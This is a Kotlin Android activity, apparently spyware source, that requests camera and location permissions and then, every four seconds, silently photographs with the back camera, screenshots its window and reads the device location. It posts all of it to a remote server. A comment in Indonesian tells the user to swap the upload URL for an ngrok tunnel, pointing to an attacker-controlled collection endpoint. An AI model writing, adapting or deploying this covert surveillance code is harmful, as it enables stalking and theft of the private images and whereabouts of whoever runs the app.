import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.location.Location
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.Executors
import android.view.WindowManager
import android.provider.MediaStore
import android.app.Activity
import android.content.Context
import java.io.FileOutputStream

class MainActivity : AppCompatActivity() {
    private lateinit var imageCapture: ImageCapture
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private val REQUEST_PERMISSIONS = 100

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        requestPermissions()
        startCamera()
        Timer().scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                takePhotoAndSend()
                takeScreenshotAndSend()
                getLocationAndSend()
            }
        }, 0, 4000)
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ),
            REQUEST_PERMISSIONS
        )
    }

    private fun startCamera() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            val cameraProvider = cameraProviderFuture.get()
            imageCapture = ImageCapture.Builder().build()
            val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA
            cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture)
        }, Executors.newSingleThreadExecutor())
    }

    private fun takePhotoAndSend() {
        val file = File(externalCacheDir, "image.jpg")
        val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()
        imageCapture.takePicture(outputOptions, Executors.newSingleThreadExecutor(), object : ImageCapture.OnImageSavedCallback {
            override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                Log.d("Camera", "Image saved")
                sendToServer(file, null, null)
            }
            override fun onError(exception: ImageCaptureException) {
                Log.e("Camera", "Error: ${exception.message}")
            }
        })
    }

    private fun takeScreenshotAndSend() {
        try {
            val bitmap = takeScreenshot()
            val file = File(externalCacheDir, "screenshot.jpg")
            FileOutputStream(file).use { out ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 100, out)
            }
            sendToServer(null, file, null)
        } catch (e: Exception) {
            Log.e("Screenshot", "Error: ${e.message}")
        }
    }

    private fun takeScreenshot(): Bitmap {
        val view = window.decorView.rootView
        view.isDrawingCacheEnabled = true
        val bitmap = Bitmap.createBitmap(view.drawingCache)
        view.isDrawingCacheEnabled = false
        return bitmap
    }

    private fun getLocationAndSend() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationClient.lastLocation.addOnSuccessListener { location: Location? ->
                location?.let {
                    val loc = "Lat: ${it.latitude}, Lon: ${it.longitude}"
                    sendToServer(null, null, loc)
                }
            }
        }
    }

    private fun sendToServer(image: File?, screenshot: File?, location: String?) {
        val client = OkHttpClient()
        val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
        if (image != null) {
            builder.addFormDataPart("image", image.name, image.asRequestBody("image/jpeg".toMediaType()))
        }
        if (screenshot != null) {
            builder.addFormDataPart("screenshot", screenshot.name, screenshot.asRequestBody("image/jpeg".toMediaType()))
        }
        if (location != null) {
            builder.addFormDataPart("location", location)
        }
        val requestBody = builder.build()
        val request = Request.Builder()
            .url("https://github.com/1Rumah/android.com/upload") // Ganti dengan URL ngrok
            .post(requestBody)
            .build()
        client.newCall(request).execute()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERMISSIONS && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
            Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Permissions denied", Toast.LENGTH_SHORT).show()
        }
    }
}
